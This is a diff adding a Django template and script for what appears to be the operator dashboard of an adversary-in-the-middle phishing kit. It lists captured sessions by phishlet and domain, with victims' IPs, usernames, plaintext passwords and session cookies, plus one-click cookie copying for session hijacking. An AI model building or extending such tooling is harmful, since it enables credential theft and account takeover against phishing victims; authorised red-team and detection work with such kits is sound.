@@ -1,0 +1,479 @@
+{% extends 'base.html' %}
+
+{% block title %}Captured Sessions{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <div class="row">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header">
+                    <h3 class="card-title">
+                        <i class="fas fa-users"></i> Captured Sessions
+                    </h3>
+                    <div class="card-tools">
+                        <span class="badge bg-primary">{{ total }} Total</span>
+                        <span class="badge bg-success">{{ sessions_with_credentials }} With Credentials</span>
+                    </div>
+                </div>
+                <div class="card-body">
+                    <!-- Filters -->
+                    <div class="row mb-3">
+                        <div class="col-md-12">
+                            {% csrf_token %}
+                            <form method="get" class="row g-3 align-items-center">
+                                <div class="col-auto">
+                                    <label for="phishlet" class="form-label me-2">Phishlet:</label>
+                                    <select name="phishlet" id="phishlet" class="form-select form-select-sm">
+                                        <option value="">All</option>
+                                        {% for phishlet in available_phishlets %}
+                                        <option value="{{ phishlet }}" {% if filters.phishlet == phishlet %}selected{% endif %}>
+                                            {{ phishlet }}
+                                        </option>
+                                        {% endfor %}
+                                    </select>
+                                </div>
+                                <div class="col-auto">
+                                    <label for="domain" class="form-label me-2">Domain:</label>
+                                    <select name="domain" id="domain" class="form-select form-select-sm">
+                                        <option value="">All</option>
+                                        {% for domain in available_domains %}
+                                        <option value="{{ domain }}" {% if filters.domain == domain %}selected{% endif %}>
+                                            {{ domain }}
+                                        </option>
+                                        {% endfor %}
+                                    </select>
+                                </div>
+                                <div class="col-auto">
+                                    <label for="ip" class="form-label me-2">IP:</label>
+                                    <input type="text" name="ip" id="ip" class="form-control form-control-sm" 
+                                           placeholder="Filter by IP" value="{{ filters.ip|default:'' }}">
+                                </div>
+                                <div class="col-auto">
+                                    <label for="has_credentials" class="form-label me-2">Credentials:</label>
+                                    <select name="has_credentials" id="has_credentials" class="form-select form-select-sm">
+                                        <option value="">All</option>
+                                        <option value="true" {% if filters.has_credentials == 'true' %}selected{% endif %}>Has Credentials</option>
+                                        <option value="false" {% if filters.has_credentials == 'false' %}selected{% endif %}>No Credentials</option>
+                                    </select>
+                                </div>
+                                <div class="col-auto">
+                                    <label for="active" class="form-label me-2">Status:</label>
+                                    <select name="active" id="active" class="form-select form-select-sm">
+                                        <option value="">All</option>
+                                        <option value="true" {% if filters.active == 'true' %}selected{% endif %}>Active</option>
+                                        <option value="false" {% if filters.active == 'false' %}selected{% endif %}>Inactive</option>
+                                    </select>
+                                </div>
+                                <div class="col-auto">
+                                    <label for="captured" class="form-label me-2">Captured:</label>
+                                    <select name="captured" id="captured" class="form-select form-select-sm">
+                                        <option value="captured" {% if filters.captured == 'captured' %}selected{% endif %}>Captured Only</option>
+                                        <option value="uncaptured" {% if filters.captured == 'uncaptured' %}selected{% endif %}>Uncaptured Only</option>
+                                        <option value="all" {% if filters.captured == 'all' %}selected{% endif %}>All Sessions</option>
+                                    </select>
+                                </div>
+                                <div class="col-auto">
+                                    <button type="submit" class="btn btn-primary btn-sm me-2">
+                                        <i class="fas fa-filter"></i> Filter
+                                    </button>
+                                    <a href="{% url 'sessions' %}" class="btn btn-secondary btn-sm">
+                                        <i class="fas fa-times"></i> Clear
+                                    </a>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+
+                    <!-- Sessions Table -->
+                    <div class="table-responsive">
+                        <table class="table table-dark table-striped table-hover">
+                            <thead>
+                                <tr>
+                                    <th>Session ID</th>
+                                    <th>Phishlet</th>
+                                    <th>Domain</th>
+                                    <th>Visitor IP</th>
+                                    <th>Credentials</th>
+                                    <th>Captured</th>
+                                    <th>Status</th>
+                                    <th>Created</th>
+                                    <th>Actions</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                {% for session in sessions %}
+                                <tr>
+                                    <td>
+                                        <code>{{ session.get_short_session_id }}</code>
+                                        <button class="btn btn-sm btn-outline-secondary ms-1" 
+                                                onclick="copyToClipboard('{{ session.session_cookie }}')"
+                                                title="Copy full session ID">
+                                            <i class="fas fa-copy"></i>
+                                        </button>
+                                    </td>
+                                    <td>
+                                        <span class="badge bg-info">{{ session.phishlet.name }}</span>
+                                    </td>
+                                    <td>{{ session.proxy_domain }}</td>
+                                    <td>
+                                        <code>{{ session.visitor_ip }}</code>
+                                        {% if session.user_agent %}
+                                        <i class="fas fa-info-circle text-muted ms-1" 
+                                           title="{{ session.user_agent }}"></i>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {% if session.captured_username or session.captured_password %}
+                                        <span class="badge bg-success">
+                                            <i class="fas fa-key"></i> Captured
+                                        </span>
+                                        {% if session.captured_username %}
+                                        <br><small class="text-muted">User: {{ session.captured_username|truncatechars:20 }}</small>
+                                        {% endif %}
+                                        {% else %}
+                                        <span class="badge bg-secondary">None</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {% if session.is_captured %}
+                                        <span class="badge bg-success">
+                                            <i class="fas fa-check"></i> Yes
+                                        </span>
+                                        {% else %}
+                                        <span class="badge bg-secondary">No</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        {% if session.is_active %}
+                                        <span class="badge bg-success">Active</span>
+                                        {% else %}
+                                        <span class="badge bg-danger">Inactive</span>
+                                        {% endif %}
+                                    </td>
+                                    <td>
+                                        <small>{{ session.created|date:"M d, Y H:i" }}</small>
+                                        <br><small class="text-muted">{{ session.created|timesince }} ago</small>
+                                    </td>
+                                    <td>
+                                        <button class="btn btn-sm btn-outline-primary" 
+                                                onclick="viewSessionDetails('{{ session.id }}')"
+                                                title="View Details">
+                                            <i class="fas fa-eye"></i>
+                                        </button>
+                                        <button class="btn btn-sm btn-outline-warning" 
+                                                onclick="toggleSessionStatus('{{ session.id }}', '{{ session.is_active|yesno:"false,true" }}')"
+                                                title="Toggle Status">
+                                            <i class="fas fa-toggle-{% if session.is_active %}on{% else %}off{% endif %}"></i>
+                                        </button>
+                                        <button class="btn btn-sm btn-outline-danger" 
+                                                onclick="deleteSession('{{ session.id }}')"
+                                                title="Delete Session">
+                                            <i class="fas fa-trash"></i>
+                                        </button>
+                                    </td>
+                                </tr>
+                                {% empty %}
+                                <tr>
+                                    <td colspan="9" class="text-center text-muted">
+                                        <i class="fas fa-inbox fa-2x mb-2"></i>
+                                        <br>No sessions found matching the current filters.
+                                    </td>
+                                </tr>
+                                {% endfor %}
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Session Details Modal -->
+<div class="modal fade" id="sessionModal" tabindex="-1" aria-labelledby="sessionModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title" id="sessionModalLabel">Session Details</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body" id="sessionModalBody">
+                <!-- Content will be loaded here -->
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+function copyToClipboard(text) {
+    // Create a temporary textarea element
+    const textarea = document.createElement('textarea');
+    textarea.value = text;
+    textarea.style.position = 'fixed';
+    textarea.style.opacity = '0';
+    document.body.appendChild(textarea);
+    
+    // Select and copy the text
+    textarea.select();
+    document.execCommand('copy');
+    
+    // Remove the temporary element
+    document.body.removeChild(textarea);
+    
+    // Show success feedback
+    const button = event.target.closest('button');
+    const originalHTML = button.innerHTML;
+    button.innerHTML = '<i class="fas fa-check"></i>';
+    button.classList.remove('btn-outline-primary');
+    button.classList.add('btn-success');
+    
+    // Reset button after 2 seconds
+    setTimeout(() => {
+        button.innerHTML = originalHTML;
+        button.classList.remove('btn-success');
+        button.classList.add('btn-outline-primary');
+    }, 2000);
+    
+    // Show toast notification
+    showToast('Cookie copied to clipboard!', 'success');
+}
+
+function showToast(message, type = 'info') {
+    // Create toast element
+    const toast = document.createElement('div');
+    toast.className = `toast align-items-center text-white bg-${type === 'success' ? 'success' : 'info'} border-0 position-fixed`;
+    toast.style.cssText = 'top: 20px; right: 20px; z-index: 9999;';
+    toast.innerHTML = `
+        <div class="d-flex">
+            <div class="toast-body">
+                ${message}
+            </div>
+            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
+        </div>
+    `;
+    
+    // Add to page
+    document.body.appendChild(toast);
+    
+    // Show toast
+    const bsToast = new bootstrap.Toast(toast);
+    bsToast.show();
+    
+    // Remove after hidden
+    toast.addEventListener('hidden.bs.toast', () => {
+        document.body.removeChild(toast);
+    });
+}
+
+function viewSessionDetails(sessionId) {
+    // Load session details via AJAX
+    fetch(`/sessions/${sessionId}/details/`)
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                const session = data.session;
+                const modalBody = document.getElementById('sessionModalBody');
+                
+                modalBody.innerHTML = `
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h6>Session Information</h6>
+                            <table class="table table-dark table-sm">
+                                <tr><td><strong>Session ID:</strong></td><td><code>${session.session_cookie}</code></td></tr>
+                                <tr><td><strong>Phishlet:</strong></td><td>${session.phishlet_name}</td></tr>
+                                <tr><td><strong>Proxy Domain:</strong></td><td>${session.proxy_domain}</td></tr>
+                                <tr><td><strong>Status:</strong></td><td>
+                                    <span class="badge bg-${session.is_active ? 'success' : 'danger'}">
+                                        ${session.is_active ? 'Active' : 'Inactive'}
+                                    </span>
+                                </td></tr>
+                                <tr><td><strong>Captured:</strong></td><td>
+                                    <span class="badge bg-${session.is_captured ? 'success' : 'secondary'}">
+                                        ${session.is_captured ? 'Yes' : 'No'}
+                                    </span>
+                                </td></tr>
+                            </table>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>Visitor Information</h6>
+                            <table class="table table-dark table-sm">
+                                <tr><td><strong>IP Address:</strong></td><td><code>${session.visitor_ip}</code></td></tr>
+                                <tr><td><strong>User Agent:</strong></td><td>${session.user_agent || 'N/A'}</td></tr>
+                                <tr><td><strong>Created:</strong></td><td>${new Date(session.created).toLocaleString()}</td></tr>
+                                <tr><td><strong>Updated:</strong></td><td>${new Date(session.updated).toLocaleString()}</td></tr>
+                            </table>
+                        </div>
+                    </div>
+                    
+                    <div class="row mt-3">
+                        <div class="col-md-6">
+                            <h6>Captured Credentials</h6>
+                            <table class="table table-dark table-sm">
+                                <tr><td><strong>Username:</strong></td><td>${session.captured_username || 'Not captured'}</td></tr>
+                                <tr><td><strong>Password:</strong></td><td>${session.captured_password || 'Not captured'}</td></tr>
+                            </table>
+                        </div>
+                        <div class="col-md-6">
+                            <h6>Captured Cookies</h6>
+                            <div class="mb-2">
+                                <button class="btn btn-sm btn-success" onclick="copyAllCookies()" title="Copy all cookies">
+                                    <i class="fas fa-copy"></i> Copy All Cookies
+                                </button>
+                            </div>
+                            
+                            ${Object.keys(session.captured_cookies).length > 0 ? 
+                                '<div class="text-success"><i class="fas fa-check-circle"></i> Cookies captured</div>' : 
+                                '<div class="text-muted">No cookies captured</div>'
+                            }
+                        </div>
+                    </div>
+                    
+                    ${Object.keys(session.captured_cookies).length > 0 ? `
+                    <div class="row mt-3">
+                        <div class="col-12">
+                            <h6>All Cookies (JSON Format) - Full Width</h6>
+                            <div class="position-relative">
+                                <button class="btn btn-sm btn-outline-secondary position-absolute top-0 end-0 m-2" onclick="copyAllCookies()" title="Copy all cookies">
+                                    <i class="fas fa-copy"></i>
+                                </button>
+                                <pre class="bg-dark text-light p-3 rounded w-100" style="max-height: 400px; overflow-y: auto; font-size: 12px; border: 1px solid #495057;"><code>${JSON.stringify(session.captured_cookies, null, 2)}</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                    ` : ''}
+                    
+                    ${Object.keys(session.captured_custom).length > 0 ? `
+                    <div class="row mt-3">
+                        <div class="col-12">
+                            <h6>Custom Captured Data</h6>
+                            <div style="max-height: 150px; overflow-y: auto;">
+                                ${Object.entries(session.captured_custom).map(([key, value]) => 
+                                    `<div><strong>${key}:</strong> ${value}</div>`
+                                ).join('')}
+                            </div>
+                        </div>
+                    </div>
+                    ` : ''}
+                `;
+                
+                const modal = new bootstrap.Modal(document.getElementById('sessionModal'));
+                modal.show();
+            } else {
+                alert('Error: ' + data.error);
+            }
+        })
+        .catch(error => {
+            console.error('Error loading session details:', error);
+            alert('Error loading session details');
+        });
+}
+
+function toggleSessionStatus(sessionId, newStatus) {
+    if (confirm('Are you sure you want to change this session status?')) {
+        fetch(`/sessions/${sessionId}/toggle/`, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value,
+                'Content-Type': 'application/json',
+            },
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                // Show success message
+                alert(data.message);
+                // Reload the page to show updated status
+                window.location.reload();
+            } else {
+                alert('Error: ' + data.error);
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('Error updating session status');
+        });
+    }
+}
+
+function deleteSession(sessionId) {
+    if (confirm('Are you sure you want to delete this session?')) {
+        fetch(`/sessions/${sessionId}/delete/`, {
+            method: 'POST',
+            headers: {
+                'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value,
+                'Content-Type': 'application/json',
+            },
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                alert(data.message);
+                window.location.reload();
+            } else {
+                alert('Error: ' + data.error);
+            }
+        })
+        .catch(error => {
+            console.error('Error deleting session:', error);
+            alert('Error deleting session');
+        });
+    }
+}
+
+function copyAllCookies() {
+    // Get the current session data from the modal
+    const modalBody = document.getElementById('sessionModalBody');
+    if (!modalBody) {
+        showToast('No session data available', 'error');
+        return;
+    }
+    
+    // Extract cookies from the current session display
+    let cookieText = '';
+    const cookieElements = modalBody.querySelectorAll('.border.rounded');
+    
+    if (cookieElements.length > 0) {
+        cookieElements.forEach(element => {
+            const nameElement = element.querySelector('strong');
+            const valueElement = element.querySelector('code');
+            if (nameElement && valueElement) {
+                const name = nameElement.textContent.replace(':', '');
+                const value = valueElement.textContent;
+                cookieText += `${name}=${value}\n`;
+            }
+        });
+    }
+    
+    if (cookieText.trim()) {
+        // Copy to clipboard
+        const textarea = document.createElement('textarea');
+        textarea.value = cookieText.trim();
+        textarea.style.position = 'fixed';
+        textarea.style.opacity = '0';
+        document.body.appendChild(textarea);
+        
+        textarea.select();
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        
+        showToast('All cookies copied to clipboard!', 'success');
+    } else {
+        showToast('No cookies to copy', 'warning');
+    }
+}
+
+// Auto-submit form when filters change
+document.addEventListener('DOMContentLoaded', function() {
+    const filterSelects = document.querySelectorAll('select[name]');
+    filterSelects.forEach(select => {
+        select.addEventListener('change', function() {
+            this.closest('form').submit();
+        });
+    });
+});
+</script>
+{% endblock %}
